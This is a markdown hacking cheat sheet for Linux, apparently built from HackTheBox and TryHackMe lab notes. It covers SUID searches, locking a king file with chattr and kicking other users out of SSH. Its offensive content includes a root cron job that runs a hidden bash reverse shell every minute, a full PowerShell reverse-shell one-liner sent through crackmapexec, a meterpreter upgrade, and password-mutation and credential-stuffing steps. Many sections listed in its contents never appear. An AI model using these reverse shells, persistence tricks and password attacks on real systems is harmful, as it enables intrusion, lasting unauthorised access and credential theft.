# Hacking linux Cheat sheet
Hacking linux 



- [one tricks/others](#one-tricksothers)
  - [looking for root permissions](#looking-for-root-permissions)
  - [using chattr](#using-chattr)
  - [fixing the vulnerability in /etc/sudoers, for example](#fixing-the-vulnerability-in-etcsudoers-for-example)
  - [finding flags](#finding-flags)
  - [full tty shell](#full-tty-shell)
  - [protecting your king using while](#protecting-your-king-using-while)
  - [how to see who is logged into the system](#how-to-see-who-is-logged-into-the-system)
  - [killing session of a user logged into ssh/system](#killing-session-of-a-user-logged-into-sshsystem)
  - [changing ssh user password](#changing-ssh-user-password)
  - [defending box](#defending-box)
  - [python http server](#python-http-server)
  - [python smb server](#python-smb-server)
  - [adding users with root privileges](#adding-users-with-root-privileges)
  - [Remove user from sudoers](#Remove-user-from-sudoers)
  - [using crontab to load a script with a reverse shell every 1 minute](#using-crontab-to-load-a-script-with-a-reverse-shell-every-1-minute)
  - [one liner bangers](#one-liner-bangers)
  - [check running services](#check-running-services)
  - [upgrade normal shell in metasploit to a meterpreter shell](#upgrade-normal-shell-in-metasploit-to-a-meterpreter-shell)
---------------------------------------------------------------------------------------------------------------------------------------------------------
- [basic local machine enumeration](#basic-local-machine-enumeration)
  - [System](#System)
  - [Users](#Users)
  - [Networking](#Networking)
  - [Running Services](#Running-Services)
  - [DNS](#DNS)
  - [SMB](#SMB)
  - [SNMP](#SNMP)
-------------------------------------------------------------------------------------------------------------------------------------------------------
## Passowrd Attacks
- [Password Mutations](#Password-Mutations)
  - [Password List](#Password-List)
  - [Hashcat Rule File](#Hashcat-Rule-File)
  - [Generating Rule based Wordlist](#Generating-Rule-based-Wordlist)
  - [Hashcat Existing Rules](#Hashcat-Existing-Rules)
  - [Generating Wordlists Using CeWL](#Generating-Wordlists-Using-CeWL)
- [Password Reuse and Default Passwords](#Password-Reuse-and-Default-Passwords)
  - [Credential Stuffing](#Credential-Stuffing)
  - [Credential Stuffing - Hydra Syntax](#Credential-Stuffing---Hydra-Syntax)
  - [Credential Stuffing - Hydra](#Credential-Stuffing---Hydra)
  - [Google Search - Default Credentials](#Google-Search---Default-Credentials)
- [Linux Password Attacks](#Linux-Password-Attacks)
- [Linux Credential Storage](#Linux-Credential-Storage)
  - [Shadow File](#Shadow-File)
  - [Passwd File](#Passwd-File)
- [Credential Hunting in Linux](#Credential-Hunting-in-Linux)
  - [Files](#Files)
  - [Configuration Files](#Configuration-Files)
  - [Credentials in Configuration Files](#Credentials-in-Configuration-Files)
  - [Databases](#Databases)
  - [Notes](#Notes)
  - [Scripts](#Scripts)
  - [Cronjobs](#Cronjobs)
  - [SSH Keys](#SSH-Keys)
  - [SSH Private Keys](#SSH-Private-Keys)
  - [SSH Public Keys](#SSH-Public-Keys)
  - [History](#History)
  - [Bash History](#Bash-History)
  - [Logs](#Logs)
  - [Memory and Cache](#Memory-and-Cache)
  - [Memory - Mimipenguin](#Memory---Mimipenguin)
  - [Memory - LaZagne](#Memory---LaZagne)
  - [Browsers](#Browsers)
  - [Firefox Stored Credentials](#Firefox-Stored-Credentials)
  - [Decrypting Firefox Credentials](#Decrypting-Firefox-Credentials)
  - [Browsers - LaZagne](#Browsers---LaZagne)
- [Passwd and Shadow and Opasswd](#Passwd-and-Shadow-and-Opasswd)
  - [Passwd File](#Passwd-File)
  - [Passwd Format](#Passwd-Format)
  - [Editing etc passwd - Before](#Editing-etc-passwd---Before)
  - [Editing etc passwd - After](#Editing-etc-passwd---After)
  - [Root without Password](#Root-without-Password)
  - [Shadow File](#Shadow-File)
  - [Shadow Format](#Shadow-Format)
  - [Shadow File](#Shadow-File)
  - [Algorithm Types](#Algorithm-Types)
  - [Opasswd](#Opasswd)
  - [Reading etc security opasswd](#Reading-etc-security-opasswd)
  - [Cracking Linux Credentials](#Cracking-Linux-Credentials)
  - [Hashcat - Cracking Unshadowed Hashes](#Hashcat---Cracking-Unshadowed-Hashes)
  - [Hashcat - Cracking MD5 Hashes](#Hashcat---Cracking-MD5-Hashes)
- [Pass the Ticket PtT from Linux](#Pass-the-Ticket-PtT-from-Linux)
  - [Kerberos on Linux](#Kerberos-on-Linux)
  - [Linux Auth via Port Forward](#Linux-Auth-via-Port-Forward)
  - [Identifying Linux and Active Directory Integration](#Identifying-Linux-and-Active-Directory-Integration)
  - [PS - Check if Linux Machine is Domain Joined](#PS---Check-if-Linux-Machine-is-Domain-Joined)
  - [Finding Kerberos Tickets in Linux](#Finding-Kerberos-Tickets-in-Linux)
  - [Finding Keytab Files](#Finding-Keytab-Files)
  - [Using Find to Search for Files with Keytab in the Name](#Using-Find-to-Search-for-Files-with-Keytab-in-the-Name)
  - [Identifying Keytab Files in Cronjobs](#Identifying-Keytab-Files-in-Cronjobs)
  - [Finding ccache Files](#Finding-ccache-Files)
  - [Reviewing Environment Variables for ccache Files](#Reviewing-Environment-Variables-for-ccache-Files)
  - [Searching for ccache Files in tmp](#Searching-for-ccache-Files-in-tmp)
  - [Abusing KeyTab Files](#Abusing-KeyTab-Files)
  - [Listing keytab File Information](#Listing-keytab-File-Information)
  - [Impersonating a User with a keytab](#Impersonating-a-User-with-a-keytab)
  - [Connecting to SMB Share as a user](#Connecting-to-SMB-Share-as-a-user)
  - [Keytab Extract](#Keytab-Extract)
  - [Extracting Keytab Hashes with KeyTabExtract](#Extracting-Keytab-Hashes-with-KeyTabExtract)
  - [Log in as a user](#Log-in-as-a-user)
  - [Obtaining More Hashes](#Obtaining-More-Hashes)
  - [Abusing Keytab ccache](#Abusing-Keytab-ccache)
  - [Privilege Escalation to Root](#Privilege-Escalation-to-Root)
  - [Looking for ccache Files](#Looking-for-ccache-Files)
  - [Identifying Group ZMembership with the id Command](-Identifying-Group-ZMembership-with-the-id-Command)
  - [Importing the ccache File into our Current Session](#Importing-the-ccache-File-into-our-Current-Session)
  - [Using Linux Attack Tools with Kerberos](#Using-Linux-Attack-Tools-with-Kerberos)
  - [Host File Modified](#Host-File-Modified)
  - [Proxychains Configuration File](#Proxychains-Configuration-File)
  - [Download Chisel to our Attack Host](#Download-Chisel-to-our-Attack-Host)
  - [Connect to a host with xfreerdp](#Connect-to-a-host-with-xfreerdp)
  - [Execute chisel from host](#Execute-chisel-from-host)
  - [Setting the KRB5CCNAME Environment Variable](#Setting-the-KRB5CCNAME-Environment-Variable)
  - [Using Impacket with proxychains and Kerberos Authentication](#Using-Impacket-with-proxychains-and-Kerberos-Authentication)
  - [Installing Kerberos Authentication Package](#Installing-Kerberos-Authentication-Package)
  - [Default Kerberos Version 5 realm](#Default-Kerberos-Version-5-realm)
  - [Administrative Server for your Kerberos Realm](#Administrative-Server-for-your-Kerberos-Realm)
  - [Kerberos Configuration File for a domain](#Kerberos-Configuration-File-for-a-domain)
  - [Using Evil-WinRM with Kerberos](#Using-Evil-WinRM-with-Kerberos)
  - [Miscellaneous](#Miscellaneous)
  - [Impacket Ticket Converter](#Impacket-Ticket-Converter)
  - [Importing Converted Ticket into Windows Session with Rubeus](#Importing-Converted-Ticket-into-Windows-Session-with-Rubeus)
  - [Linikatz](#Linikatz)

---------------------------------------------------------------------------------------------------------------------------------------------------------
- [Linux Privilige Escalation](#Linux-Privilige-Escalation)

- [Tib3rius ⁣Privilege Escalation](#Tib3rius-Privilege-Escalation)
  - [Setup](#Setup) 
  - [General Concepts](#General-Concepts)
  - [Understanding Permissions in Linux](#Understanding-Permissions-in-Linux)
    - [Users Groups and Files and Directories](#Users-Groups-and-Files-and-Directories)
    - [priv-esc Users](#priv-esc-Users)
    - [Groups](#Groups)
    - [Files and Directories](#Files-and-Directories)
    - [File Permissions](#File-Permissions)
    - [Directory Permissions](#Directory-Permissions)
    - [Special Permissions](#Special-Permissions)
    - [Viewing Permissions](#Viewing-Permissions)
    - [Real and Effective and Saved UID and GID](#Real-and-Effective-and-Saved-UID-and-GID)
  - [Spawning Root Shells](#Spawning-Root-Shells)
    - [rootbash SUID](#rootbash-SUID)
    - [Custom Executable](#Custom-Executable)
    - [Native Reverse Shells](#Native-Reverse-Shells)
  - [Privilege Escalation Tools](#Privilege-Escalation-Tools)
    - [Why use tools](#Why-use-tools)
    - [Linux Smart Enumeration](#Linux-Smart-Enumeration)
    - [LinEnum](#LinEnum)
    - [Other Tools](#Other-Tools)
- [Kernel Exploits](#Kernel-Exploits)
- [Service Exploits](#Service-Exploits)
  - [Services Running as Root](#Services-Running-as-Root)
  - [Enumerating Program Versions](#Enumerating-Program-Versions)
  - [Port Forwarding](#Port-Forwarding)
- [Weak File Permissions 1](#Weak-File-Permissions-1)
  - [Useful Commands](#Useful-Commands)
  - [Backups](#Backups)
- [sudo](#sudo)
  - [What is sudo](#What-is-sudo)
  - [Useful sudo Commands](#Useful-sudo-Commands)
  - [Known Password](#Known-Password)
  - [Other Methods](#Other-Methods)
  - [Shell Escape Sequences](#Shell-Escape-Sequences)
  - [Abusing Intended Functionality](#Abusing-Intended-Functionality)
  - [Environment Variables](#Environment-Variables)
  - [LD PRELOAD](#LD-PRELOAD)
    - [Limitations](#Limitations)
  - [LD LIBRARY PATH](#LD-LIBRARY-PATH)
- [Cron Jobs](#Cron-Jobs)
  
  
-------------------------------------------------------------------------------------------------------------------------------------------------------
- [Linux Privilige Escalation 1](#Linux-Privilige-Escalation-1)
  - [Automated Enumeration Tools](#Automated-Enumeration-Tools)
  - [Enumeration](#Enumeration)
  - [Privilege Escalation Kernel Exploits](#Privilege-Escalation-Kernel-Exploits)
  - [Privilege Escalation Sudo](#Privilege-Escalation-Sudo)
  - [Privilege Escalation SUID](#Privilege-Escalation-SUID)
  - [Privilege Escalation Capabilities](#Privilege-Escalation-Capabilities)
  - [Privilege Escalation Cron Jobs](#Privilege-Escalation-Cron-Jobs)
  - [Privilege Escalation PATH](#Privilege-Escalation-PATH)
  - [Privilege Escalation NFS](#Privilege-Escalation-NFS)
- [Linux Privilige Escalation 2](#Linux-Privilige-Escalation-2)
  - [Kernel Exploits](#Kernel-Exploits)
  - [Stored Passwords (Config Files)](#Stored-Passwords-Config-Files)
  - [Stored Passwords (History)](#Stored-Passwords-History)
  - [Weak File Permissions](#Weak-File-Permissions)
  - [SSH Keys](#SSH-Keys)
  - [Sudo (Shell Escaping)](#Sudo-Shell-Escaping)
  - [Sudo (Abusing Intended Functionality)](#Sudo-Abusing-Intended-Functionality)
  - [Sudo (LD_PRELOAD)](#Sudo-LD_PRELOAD)
  - [SUID (Shared Object Injection)](#SUID-Shared-Object-Injection)
  - [SUID (Symlinks)](#SUID-Symlinks)
  - [SUID (Environment Variables #1)](#SUID-Environment-Variables-1)
  - [SUID (Environment Variables #2)](#SUID-Environment-Variables-2)
  - [Cron (Path)](#Cron-Path)
  - [Capabilities](#Capabilities)
  - [Cron (Wildcards)](#Cron-Wildcards)
  - [Cron (File Overwrite)](#Cron-File-Overwrite)
  - [NFS Root Squashing](#NFS-Root-Squashing)
-------------------------------------------------------------------------------------------------------------------------------------------------------
## linux local password attacks hackthebox
- [credential hunting in linux](#credential-hunting-in-linux)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [passwd shadow and opasswd](#passwd-shadow-and-opasswd)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
-------------------------------------------------------------------------------------------------------------------------------------------------------
  
  # one tricks/others

### looking for root permissions

* you can use find to search for permissions with root

```
find / -type f \( -perm -4000 -o -perm -2000 \) -print
```
* Find SUID privescs using the following commands:
```
find / -perm -u=s -type f 2>/dev/null
```

* Find SGID privescs using the following commands:
```
find / -perm -g=s -type f 2>/dev/null
```



### using chattr

* you can use this to make the file immutable and therefore keep your name in this file.
* if the box dont have chattr you can simply install chattr or download chattr binary or busybox binary 

Add the immutability bit:
```
chattr +i /root/king.txt
```

Remove the immutability bit:
```
chattr -i /root/king.txt
```

Remove chattr:
```
which chattr # Get chattr's path, default: /usr/bin/chattr
```

```
rm usr/bin/chattr # Or another path if different
```



### fixing the vulnerability in /etc/sudoers, for example

```
# User privilege specification
root ALL=(ALL=ALL) ALL
teste ALL=(root) SETENV:NOPASSWD: /usr/bin/git *, /usr/bin/chattr
test1 ALL=(root) NOPASSWD: /bin/su test1, /usr/bin/chattr
```

* here you can see that user teste and teste1 has root permission on the git and su binary, to fix this just remove everything from the teste and teste1 there

```
root ALL=(ALL=ALL) ALL
```

* and it will be like that, so there will be no way to climb privilege by su and git

### finding flags

## using find

* you can use find to look for flags

```
find / -name flag.txt 2>/dev/null
find / -name user.txt 2>/dev/null
find / -name .flag 2>/dev/null
find / -name flag 2>/dev/null
find / -name root.txt 2>/dev/null
```

## using grep

ops this one is for when the directory you are in at the momoent
```
grep -ri thm{ 2>/dev/null
```

### full tty shell

* tweaking your shell, if you get a reverse shell and you ctrl + c and your shell closes/stops, this will help you and you can edit, give ctrl + c at will

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
export TERM=xterm
Ctrl + z
stty raw -echo;fg
```
* for you to know which pts (pseudo slave terminal) the user is connected, just use the following command in the terminal: w , then just see which pts the user is and use the command

* extra: this works sometimes too 

```
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm
Ctrl + z
stty raw -echo;fg
```

## protecting your king using while
this one is using chattr too to protect the file 
```
while true; do echo "suljov" > /root/king.txt; chattr +ia king.txt; set -O noclobber king.txt; done &
```


## how to see who is logged into the system

* you can use the following commands to see who is logged into ssh/system

```
w
who
ps aux | grep pts
```

## killing session of a user logged into ssh/system

* to kill someone's session just use the following command
manual:
```
pkill -9 -t pts/1
```
## kicking all users connected in ssh
```
kill `ps aux|grep pts| awk '{print $2}'`;
```

## kicking all people connected to a given user on ssh 
```
pkill -9 -U <name> 
```


* as explained in some examples above, just put the pts of the user you want to remove from the machine

### changing ssh user password

* to change a user's password just use the following command

```
passwd [UserName]
```

* you can change ssh keys



### defending box

* Look for common ways to fix a box, for example: changing ssh keys, changing passwords, look for running processes or even in cronjobs

* Always set your persistence so that even if someone kicks you out, you have multiple ways to get back.

* So start fixing things in the box. Fix security issues, not legitimate services. For example, disabling ssh is NOT allowed unless it is an intentionally broken ssh installation.

## python http server

```
python3 -m http.server <port>
```

## python smb server
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

## adding users with root privileges

first
```
adduser <name> 
```
then edit the /etc/sudoers with this 
```
<user> ALL=(ALL:ALL) ALL
```



 
## Remove user from sudoers
```
nano /etc/sudoers
```

or alternative
```
visudo
```

## using crontab to load a script with a reverse shell every 1 minute
first
```
echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" > .persistence.sh
```
then
```
chmod +x .persistence.sh
```
after that you go in to vim
```
vim /etc/crontab
```
and add this 
```
* * * * * root /dev/shm/.persistence.sh
```
save and quit then you can connect with a reverse shell every 1 minute with nc like 
```
nc -lvnp <PORT> 
```

## one liner bangers


```
sudo crackmapexec smb --exec-method atexec -d INLANEFREIGHT.LOCAL -u xxxxx-p xxxxx -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""172.16.5.225""""; $port=""""4444"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};' 172.16.5.5
```
## check running services
```
netstat 
```
```
netstat -tulwn
```

### upgrade normal shell in metasploit to a meterpreter shell

if you can get a shell but for some reason cant get the meterpreter shell to work do this.

get a shell with just a generic shell on metasploit when use this: 
```
use multi/manage/shell_to_meterpreter
```

then update the opstions and then write:
```
run
```
  
---------------------------------------------------------------------------------------------------------------------------------------------------------
  
### basic local machine enumeration
This task focuses on enumerating a Linux machine after accessing a shell, such as bash. Although some commands provide information on more than one area, we tried to group the commands into four categories depending on the information we expect to acquire.

*    System
*    Users
*    Networking
*    Running Services
  
### system 
On a Linux system, we can get more information about the Linux distribution and release version by searching for files or links that end with -release in /etc/. Running ls /etc/*-release helps us find such files. Let’s see what things look like on a CentOS Linux.

![image](https://user-images.githubusercontent.com/24814781/187430324-3771f669-0e61-49a5-b43d-fd8776befccc.png)

We can find the system’s name using the command hostname.

![image](https://user-images.githubusercontent.com/24814781/187430810-24cc152b-6aed-49f9-b663-c7e372c856b8.png)

Various files on a system can provide plenty of useful information. In particular, consider the following /etc/passwd, /etc/group, and /etc/shadow. Any user can read the files passwd and group. However, the shadow password file requires root privileges as it contains the hashed passwords. If you manage to break the hashes, you will know the user’s original password.

![image](https://user-images.githubusercontent.com/24814781/187430923-40f0d174-9c38-4ca2-b37a-bcda8645353b.png)

Similarly, various directories can reveal information about users and might contain sensitive files; one is the mail directories found at /var/mail/.

![image](https://user-images.githubusercontent.com/24814781/187431071-745c19f6-a9e5-4ee2-9c48-8cbd2639cdc0.png)

To find the installed applications you can consider listing the files in /usr/bin/ and /sbin/:

*    ls -lh /usr/bin/
*    ls -lh /sbin/

On an RPM-based Linux system, you can get a list of all installed packages using rpm -qa. The -qa indicates that we want to query all packages.

On a Debian-based Linux system, you can get the list of installed packages using dpkg -l. The output below is obtained from an Ubuntu server.


![image](https://user-images.githubusercontent.com/24814781/187431240-923551b1-24cb-4867-b3c5-3d06a92e76a4.png)


### users
Files such as /etc/passwd reveal the usernames; however, various commands can provide more information and insights about other users on the system and their whereabouts.

You can show who is logged in using who.

![image](https://user-images.githubusercontent.com/24814781/187431344-bc079502-51b9-40af-a4cb-1aed0d249281.png)

We can see that the user root is logged in to the system directly, while the users jane and peter are connected over the network, and we can see their IP addresses.

Note that who should not be confused with whoami which prints your effective user id.

![image](https://user-images.githubusercontent.com/24814781/187431543-09223d3b-b54f-428f-b118-bf2f61725532.png)

To take things to the next level, you can use w, which shows who is logged in and what they are doing. Based on the terminal output below, peter is editing notes.txt and jane is the one running w in this example.

![image](https://user-images.githubusercontent.com/24814781/187431613-fca51f41-3194-4eeb-aad3-726ff0b2490c.png)

To print the real and effective user and group IDS, you can issue the command id (for ID).

![image](https://user-images.githubusercontent.com/24814781/187431912-1c995d33-c33a-4002-ac1c-5e9a9015ff4d.png)


Do you want to know who has been using the system recently? last displays a listing of the last logged-in users; moreover, we can see who logged out and how much they stayed connected. In the output below, the user randa remained logged in for almost 17 hours, while the user michael logged out after four minutes.

![image](https://user-images.githubusercontent.com/24814781/187432000-dbb3079a-5b24-4961-8dee-8d689432061e.png)

Finally, it is worth mentioning that sudo -l lists the allowed command for the invoking user on the current system.


###  Networking

The IP addresses can be shown using ip address show (which can be shortened to ip a s) or with the older command ifconfig -a (its package is no longer maintained.) The terminal output below shows the network interface ens33 with the IP address 10.20.30.129 and subnet mask 255.255.255.0 as it is 24.

![image](https://user-images.githubusercontent.com/24814781/187432077-abd059db-566d-4368-908f-1fb6b20b0140.png)

The DNS servers can be found in the /etc/resolv.conf. Consider the following terminal output for a system that uses DHCP for its network configurations. The DNS, i.e. nameserver, is set to 10.20.30.2.

![image](https://user-images.githubusercontent.com/24814781/187432232-49bf1d26-556d-441a-8202-6a9646719779.png)

netstat is a useful command for learning about network connections, routing tables, and interface statistics. We explain some of its many options in the table below.

![image](https://user-images.githubusercontent.com/24814781/187432343-cd448868-41fb-40bf-bf92-e6385576d0ea.png)

You can use any combination that suits your needs. For instance, netstat -plt will return Programs Listening on TCP sockets. As we can see in the terminal output below, sshd is listening on the SSH port, while master is listening on the SMTP port on both IPv4 and IPv6 addresses. Note that to get all PID (process ID) and program names, you need to run netstat as root or use sudo netstat.

![image](https://user-images.githubusercontent.com/24814781/187432440-ba17a00e-9514-45de-b959-c813b40c92b9.png)

netstat -atupn will show All TCP and UDP listening and established connections and the program names with addresses and ports in numeric format.

![image](https://user-images.githubusercontent.com/24814781/187432774-1968524a-8758-47db-9233-4725ce005135.png)

One might think that using nmap before gaining access to the target machine would have provided a comparable result. However, this is not entirely true. Nmap needs to generate a relatively large number of packets to check for open ports, which can trigger intrusion detection and prevention systems. Furthermore, firewalls across the route can drop certain packets and hinder the scan, resulting in incomplete Nmap results.

lsof stands for List Open Files. If we want to display only Internet and network connections, we can use lsof -i. The terminal output below shows IPv4 and IPv6 listening services and ongoing connections. The user peter is connected to the server rpm-red-enum.thm on the ssh port. Note that to get the complete list of matching programs, you need to run lsof as root or use sudo lsof.

![image](https://user-images.githubusercontent.com/24814781/187433028-e1a2c1a5-32a2-4314-bc08-65dd36b8cc61.png)

Because the list can get quite lengthy, you can further filter the output by specifying the ports you are interested in, such as SMTP port 25. By running lsof -i :25, we limit the output to those related to port 25, as shown in the terminal output below. The server is listening on port 25 on both IPv4 and IPv6 addresses.

![image](https://user-images.githubusercontent.com/24814781/187433134-1ddd5430-3c04-46b1-ae77-6fd923569def.png)

### Running Services
Getting a snapshot of the running processes can provide many insights. ps lets you discover the running processes and plenty of information about them.

You can list every process on the system using ps -e, where -e selects all processes. For more information about the process, you can add -f for full-format and-l for long format. Experiment with ps -e, ps -ef, and ps -el.

You can get comparable output and see all the processes using BSD syntax: ps ax or ps aux. Note that a and x are necessary when using BSD syntax as they lift the “only yourself” and “must have a tty” restrictions; in other words, it becomes possible to display all processes. The u is for details about the user that has the process.

![image](https://user-images.githubusercontent.com/24814781/187433222-85c5f931-2d0f-43ef-9aa3-6a594637fe78.png)

For more “visual” output, you can issue ps axjf to print a process tree. The f stands for “forest”, and it creates an ASCII art process hierarchy as shown in the terminal output below.

![image](https://user-images.githubusercontent.com/24814781/187433539-4c7da5e2-b29d-48f8-a276-195ec5867fab.png)

To summarize, remember to use ps -ef or ps aux to get a list of all the running processes. Consider piping the output via grep to display output lines with certain words. The terminal output below shows the lines with peter in them.

![image](https://user-images.githubusercontent.com/24814781/187433650-89563cb8-60c8-4cf0-b823-cdaf5fff0491.png)


### DNS
We are all familiar with Domain Name System (DNS) queries where we can look up A, AAAA, CName, and TXT records, among others.
If we can get a “copy” of all the records that a DNS server is responsible for answering, we might discover hosts we didn’t know existed.

One easy way to try DNS zone transfer is via the dig command.

Depending on the DNS server configuration, DNS zone transfer might be restricted. If it is not restricted, it should be achievable using 
```
dig -t AXFR DOMAIN_NAME @DNS_SERVER
```
The -t AXFR indicates that we are requesting a zone transfer, while @ precedes the DNS_SERVER that we want to query regarding the records related to the specified DOMAIN_NAME.


### SMB

Server Message Block (SMB) is a communication protocol that provides shared access to files and printers. We can check shared folders using net share. Here is an example of the output. We can see that C:\Internal Files is shared under the name Internal.

![image](https://user-images.githubusercontent.com/24814781/187435886-2cf6ba25-0b84-4b41-8666-cea49a0e246c.png)


### SNMP

Simple Network Management Protocol (SNMP) was designed to help collect information about different devices on the network. It lets you know about various network events, from a server with a faulty disk to a printer out of ink. Consequently, SNMP can hold a trove of information for the attacker. One simple tool to query servers related to SNMP is snmpcheck. You can find it on the AttackBox at the /opt/snmpcheck/ directory; the syntax is quite simple: /opt/snmpcheck/snmpcheck.rb 10.10.215.169 -c COMMUNITY_STRING.
If you would like to install snmpcheck on your local Linux box, consider the following commands. 

![image](https://user-images.githubusercontent.com/24814781/187435981-6446e39a-c9b5-4810-8989-e6f16d3cc9f8.png)

--------------------------------------------------------------------------------------------------------------------------------------------------------
## Password Attacks


## Password Mutations

Many people create their passwords according to simplicity instead of security. To eliminate this human weakness that often compromises security measures, password policies can be created on all systems that determine how a password should look. This means that the system recognizes whether the password contains capital letters, special characters, and numbers. In addition, most password policies require a minimum length of eight characters in a password, including at least one of the above specifications.

In the previous sections, we guessed very simple passwords, but it becomes much more difficult to adapt this to systems that apply password policies that force the creation of more complex passwords.

Unfortunately, the tendency for users to create weak passwords also occurs despite the existence of password policies. Most people/employees follow the same rules when creating more complex passwords. Passwords are often created closely related to the service used. This means that many employees often select passwords that can have the company's name in the passwords. A person's preferences and interests also play a significant role. These can be pets, friends, sports, hobbies, and many other elements of life. OSINT information gathering can be very helpful for finding out more about a user's preferences and may assist with password guessing.

Commonly, users use the following additions for their password to fit the most common password policies:

![image](https://user-images.githubusercontent.com/24814781/203631831-dc4199e9-e10d-4090-9af4-2c0acb0b733d.png)

Considering that many people want to keep their passwords as simple as possible despite password policies, we can create rules for generating weak passwords. Based on statistics provided by WPengine
```
https://wpengine.com/resources/passwords-unmasked-infographic/
```

most password lengths are not longer than ten characters. So what we can do is to pick specific terms that are at least five characters long and seem to be the most familiar to the users, such as the names of their pets, hobbies, preferences, and other interests. If the user chooses a single word (such as the current month), adds the current year, followed by a special character, at the end of their password, we would reach the ten-character password requirement. Considering that most companies require regular password changes, a user can modify their password by just changing the name of a month or a single number, etc. Let's use a simple example to create a password list with only one entry.

### Password List
example:
```
Suljov@htb[/htb]$ cat password.list

password
```
We can use a very powerful tool called Hashcat
```
https://hashcat.net/hashcat/
```
to combine lists of potential names and labels with specific mutation rules to create custom wordlists.

Hashcat uses a specific syntax for defining characters and words and how they can be modified. The complete list of this syntax can be found in the official documentation
```
https://hashcat.net/wiki/doku.php?id=rule_based_attack
```
of Hashcat. However, the ones listed below are enough for us to understand how Hashcat mutates words.

![image](https://user-images.githubusercontent.com/24814781/203632158-23d50fb8-f5fc-48f5-a857-32ff0412c931.png)

Each rule is written on a new line which determines how the word should be mutated. If we write the functions shown above into a file and consider the aspects mentioned, this file can then look like this:

### Hashcat Rule File
example:
```
Suljov@htb[/htb]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

Hashcat will apply the rules of custom.rule for each word in password.list and store the mutated version in our mut_password.list accordingly. Thus, one word will result in fifteen mutated words in this case.

### Generating Rule-based Wordlist

```
Suljov@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
Suljov@htb[/htb]$ cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

Hashcat and John come with pre-built rule lists that we can use for our password generating and cracking purposes. One of the most used rules is best64.rule, which can often lead to good results. It is important to note that password cracking and the creation of custom wordlists is a guessing game in most cases. We can narrow this down and perform more targeted guessing if we have information about the password policy and take into account the company name, geographical region, industry, and other topics/words that users may select from to create their passwords. Exceptions are, of course, cases where passwords are leaked and found.

### Hashcat Existing Rules

```
Suljov@htb[/htb]$ ls /usr/share/hashcat/rules/

best64.rule                  specific.rule
combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
d3ad0ne.rule                 T0XlC-insert_space_and_special_0_F.rule
dive.rule                    T0XlC-insert_top_100_passwords_1_G.rule
generated2.rule              T0XlC.rule
generated.rule               T0XlCv1.rule
hybrid                       toggles1.rule
Incisive-leetspeak.rule      toggles2.rule
InsidePro-HashManager.rule   toggles3.rule
InsidePro-PasswordsPro.rule  toggles4.rule
leetspeak.rule               toggles5.rule
oscommerce.rule              unix-ninja-leetspeak.rule
rockyou-30000.rule
```

We can now use another tool called CeWL
```
https://github.com/digininja/CeWL
```

to scan potential words from the company's website and save them in a separate list. We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password. We specify some parameters, like the depth to spider (-d), the minimum length of the word (-m), the storage of the found words in lowercase (--lowercase), as well as the file where we want to store the results (-w).

### Generating Wordlists Using CeWL
```
Suljov@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
Suljov@htb[/htb]$ wc -l inlane.wordlist

326
```
-----

## Password Reuse and default Passwords

It is common for both users and administrators to leave defaults in place. Administrators have to keep track of all the technology, infrastructure, and applications along with the data being accessed. In this case, the same password is often used for configuration purposes, and then the password is forgotten to be changed for one interface or another. In addition, many applications that work with authentication mechanisms, basically almost all, often come with default credentials after installation. These default credentials may be forgotten to be changed after configuration, especially when it comes to internal applications where the administrators assume that no one else will find them and do not even try to use them.

In addition, easy-to-remember passwords that can be typed quickly instead of typing 15-character long passwords are often used repeatedly because Single-Sign-On (SSO)
```
https://en.wikipedia.org/wiki/Single_sign-on
```

is not always immediately available during initial installation, and configuration in internal networks requires significant changes. When configuring networks, we sometimes work with vast infrastructures (depending on the company's size) that can have many hundreds of interfaces. Often one network device, such as a router, printer, or a firewall, is overlooked, and the default credentials are used, or the same password is reused.

## Credential Stuffing

There are various databases that keep a running list of known default credentials. One of them is the DefaultCreds-Cheat-Sheet.

```
https://github.com/ihebski/DefaultCreds-cheat-sheet
```
Here is a small excerpt from the entire table of this cheat sheet:


![image](https://user-images.githubusercontent.com/24814781/203636551-c04ce3b0-b130-4da4-a900-1285d9041ec1.png)

